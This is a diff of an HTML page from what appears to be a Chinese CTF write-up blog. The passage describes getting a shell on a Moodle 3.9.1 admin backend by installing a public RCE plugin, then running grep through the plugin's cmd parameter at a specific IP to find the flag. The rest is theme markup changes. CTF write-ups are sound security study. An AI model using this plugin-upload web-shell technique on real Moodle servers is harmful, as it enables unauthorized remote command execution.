+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802213430881.png" title="image-20220802213430881" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802213430881.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802213430881.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213430881.png, https://tuchuang.huamang.xyz/img/image-20220802213430881.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213430881.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802213430881.png">
+    </a></p>
 <p>这个moodle版本是3.9.1，后台是可以getshell的，这里通过加载一个插件去getshell</p>
 <p>我用的现成的</p>
-<p><a href="https://github.com/HoangKien1020/Moodle_RCE" target="_blank" rel="noopener noreffer">https://github.com/HoangKien1020/Moodle_RCE</a>
-</p>
+<p><a href="https://github.com/HoangKien1020/Moodle_RCE" target="_blank" rel="noopener noreferrer">https://github.com/HoangKien1020/Moodle_RCE</a></p>
 <p>安装这个rce插件即可</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802213443651.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213443651.png, https://tuchuang.huamang.xyz/img/image-20220802213443651.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213443651.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802213443651.png"
-        title="image-20220802213443651" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802213443651.png" title="image-20220802213443651" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802213443651.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802213443651.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213443651.png, https://tuchuang.huamang.xyz/img/image-20220802213443651.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213443651.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802213443651.png">
+    </a></p>
 <p>然后find找flag即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1806,20 +1838,24 @@ Table: mdl_user_private_key
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://47.105.52.19:8888/blocks/rce/lang/en/block_rce.php?cmd=grep -r &#39;flag{.*}&#39; /etc
 </code></pre></td></tr></table>
 </div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802213503580.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213503580.png, https://tuchuang.huamang.xyz/img/image-20220802213503580.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213503580.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802213503580.png"
-        title="image-20220802213503580" /></p>
-</div><div class="post-footer" id="post-footer">
+</div><p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802213503580.png" title="image-20220802213503580" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802213503580.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802213503580.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213503580.png, https://tuchuang.huamang.xyz/img/image-20220802213503580.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213503580.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802213503580.png">
+    </a></p>
+</div>
+
+        <div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
                 <span>更新于 2022-07-31</span>
-            </div></div>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
@@ -1835,20 +1871,26 @@ Table: mdl_user_private_key
         </section>
     </div>
 
-    <div class="post-nav"><a href="/typhoonconctf2022/" class="prev" rel="prev" title="[TyphoonCon CTF 2022] WP"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[TyphoonCon CTF 2022] WP</a>
-            <a href="/ssti/" class="next" rel="next" title="SSTI_OF_FLASK">SSTI_OF_FLASK<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/typhoonconctf2022/" class="prev" rel="prev" title="[TyphoonCon CTF 2022] WP"><i class="fas fa-angle-left fa-fw"></i>[TyphoonCon CTF 2022] WP</a>
+            <a href="/ssti/" class="next" rel="next" title="SSTI_OF_FLASK">SSTI_OF_FLASK<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 </article></div>
-            </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span></div>
-        </div>
-    </footer></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
 
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
-                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
-                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
-            </a>
-        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.0/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.11.0/dist/algoliasearch.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/topbar@1.0.1/topbar.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@sliphua/pjax@2.4.0/dist/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js"></script></div>
+</body>
+
 </html>
